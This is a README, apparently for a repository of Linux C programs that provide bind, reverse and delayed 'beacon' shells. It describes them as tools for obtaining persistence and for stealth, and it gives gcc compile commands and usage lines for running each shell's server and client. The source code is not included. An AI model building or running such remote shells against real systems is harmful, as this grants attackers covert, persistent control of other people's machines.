# Description
These are binaries that you can compile and execute to obtain persistence.
- Bind Shells
- Reverse Shells
- Beacon-like Shells

Note: Currently these shells are Linux specific meaning they most likely won't run on Windows OS. Windows shells will come in the future though!

# Compiling
To compile the binaries, simply run:
```
gcc -o server server.c && gcc -o client client.c
```

# Usage

## Bind Shells
The server port is statically set within the server. If you wish to change it, change the PORT variable. Default is 4444.
```
./server <PORT>

rlwrap ./client <IP> <Port>
```
I also suggest using the `rlwrap` tool when executing the client. This tool allows you to scroll through previous commands and use arrow keys to edit your commands.

## Reverse Shells
The `port` and `IP address` is statically set within the client. You can change it by editing the `PORT` and `ip_addr` variables.
```
rlwrap ./server <PORT>

./client <IP> <PORT>
```
I also suggest using the `rlwrap` tool when executing the client. This tool allows you to scroll through previous commands and use arrow keys to edit your commands.

## Beacon Shells
These are basically reverse shells except they have a delay in which they grab commands. This can be helpful in stealth. HTTP based beacon shells may come in the future!
```
rlwrap ./server <PORT>

./client <IP> <PORT>
```
